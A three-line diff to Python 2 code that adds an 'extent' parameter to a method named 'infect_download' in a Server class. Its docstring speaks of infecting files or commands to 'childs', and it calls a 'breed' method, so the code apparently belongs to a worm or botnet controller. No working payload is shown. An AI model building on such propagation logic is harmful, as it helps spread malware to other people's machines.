@@ -200,7 +200,7 @@ class Server(object):
 
         except Exception, e:
             print e
-    def infect_download(self,path):
+    def infect_download(self,path,extent=False):
         '''infect a file or command to childs or whole'''
         if self.childs is None:
             self.breed()
